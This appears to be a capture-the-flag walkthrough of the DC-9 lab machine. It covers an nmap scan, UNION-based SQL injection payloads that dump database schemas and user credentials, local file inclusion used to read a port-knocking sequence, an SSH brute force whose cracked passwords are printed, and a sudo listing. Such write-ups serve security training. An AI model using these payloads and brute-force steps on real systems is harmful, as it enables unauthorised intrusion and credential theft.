??$ nmap $ip -sC -sV -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 14:05 +0000
Nmap scan report for 192.168.55.209
Host is up (0.00056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

gobuster
/css
/includes

search
search='or 1=1--' retrieves all. sql injection works
<img width="416" height="495" alt="image" src="https://github.com/user-attachments/assets/255fa331-09d1-4e9c-bc33-78ea1470d1a4" />

IDENTIY number of columns (eg 6 nulls for 6 columns)
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--

Retrieve database names
' UNION SELECT NULL,NULL,NULL,NULL,NULL,schema_name FROM information_schema.schemata-- -

Retrieve table name
' UNION SELECT NULL,NULL,NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='Staff'-- -

dump column information
' UNION SELECT NULL,NULL,NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='Users'-- -

' UNION SELECT NULL,NULL,NULL,NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name='Users'-- -

dump info
' UNION SELECT NULL,NULL,NULL,NULL,NULL,group_concat(username," | ",password) FROM Staff.Users-- -

<img width="516" height="181" alt="image" src="https://github.com/user-attachments/assets/924f0420-c3c7-4c11-806b-38e9a5d37e7a" />

cracked
<img width="1056" height="292" alt="image" src="https://github.com/user-attachments/assets/7d7ea8ed-f918-46cd-a756-7c4808e3ed50" />
<img width="983" height="176" alt="image" src="https://github.com/user-attachments/assets/e2bc6382-73ed-4996-8a49-ce646e0494ee" />


site said file does not exist so tested for Local File Inclusion (LFI)
<img width="1272" height="750" alt="image" src="https://github.com/user-attachments/assets/d24e94bd-ebd4-45a6-890c-84d940376bea" />


in the beginning nmap it said "Filtered ssh" so check for knockd installation and get sequence
<img width="1074" height="547" alt="image" src="https://github.com/user-attachments/assets/10b0931f-2172-4aea-acc4-34114b0b113c" />

Run knock on the sequence then ssh
knock -v 192.168.58.209 7469 8475 9842

bruteforced into user account janitor
<img width="677" height="295" alt="image" src="https://github.com/user-attachments/assets/86d4dcb0-cda4-4193-bd57-16c875835942" />

passwordlist in janitor folder
<img width="623" height="120" alt="image" src="https://github.com/user-attachments/assets/ddae5abe-6d95-4c6a-ac62-9611891d2dcd" />

bruteforce using janitor password list
<img width="783" height="223" alt="image" src="https://github.com/user-attachments/assets/a630fee2-fb70-4a41-9c7b-d4922bddc305" />

[22][ssh] host: 192.168.58.209   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.58.209   login: joeyt   password: Passw0rd

fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test







